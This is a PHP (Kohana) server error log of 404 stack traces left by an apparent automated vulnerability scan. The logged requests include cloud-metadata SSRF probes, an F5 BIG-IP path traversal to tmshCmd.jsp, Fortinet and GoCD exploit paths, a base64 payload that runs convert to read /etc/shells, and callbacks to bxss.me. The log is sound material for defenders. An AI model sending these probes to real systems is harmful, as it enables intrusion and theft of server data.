#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.0.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.0.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.1-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.1-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.0-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.0-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.0-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.0-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.2-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.2-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.2.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.2.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.1-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.1-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.2-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.2-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: KOdWZ8DuS4.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: KOdWZ8DuS4.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.1-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.1-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.2-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.2-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL 3184654015 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL 3184654015 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: metadata/v1.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: metadata/v1.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pages/doenterpagevariables.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pages/doenterpagevariables.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL computeMetadata/v1/project was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL computeMetadata/v1/project was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mbQ50liHEi.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mbQ50liHEi.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL computeMetadata/v1/project was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL computeMetadata/v1/project was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL metadata/instance was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL metadata/instance was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL opc/v2/instance was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL opc/v2/instance was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: metadata/v1.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: metadata/v1.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL hetzner/v1/metadata was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL hetzner/v1/metadata was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: openstack/latest/meta_data.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: openstack/latest/meta_data.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: v1lVfxELys.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: v1lVfxELys.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:17 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:17 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: metadata/v1.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: metadata/v1.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:17 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL computeMetadata/v1/project was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:17 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL computeMetadata/v1/project was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:17 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:17 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:17 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:17 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: qIyCnlH8jX.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: qIyCnlH8jX.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:18 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/content was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:18 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/content was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ==/test.jpeg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ==/test.jpeg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tmui/login.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tmui/login.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: render/http:/bxss.me/t/fit.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: render/http:/bxss.me/t/fit.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:18 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL mgmt/tm/util/bash was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:18 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL render was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:18 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL mgmt/tm/util/bash was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:18 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL render was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hsqldb; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hsqldb; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ==/test.jpeg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ==/test.jpeg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: http:/bxss.me/t/fit.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: http:/bxss.me/t/fit.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: configWizard/keyUpload.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: configWizard/keyUpload.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:19 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL remote/fgt_lang was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:19 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL remote/fgt_lang was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/v2/cmdb/vpn.ssl/settings ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/v2/cmdb/vpn.ssl/settings ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: screenshot/http:/bxss.me/t/fit.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: screenshot/http:/bxss.me/t/fit.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:20 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL go/add-on/business-continuity/api/cruise_config was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:20 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL go/add-on/business-continuity/api/cruise_config was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:20 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:20 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:21 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL LetsEncrypt/Index was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:21 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL LetsEncrypt/Index was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:22 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL LetsEncrypt/Index was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:22 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL LetsEncrypt/Index was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: horde/imp/test.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: horde/imp/test.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:23 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:23 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mifs/aad/api/v2/authorized/users ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mifs/aad/api/v2/authorized/users ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
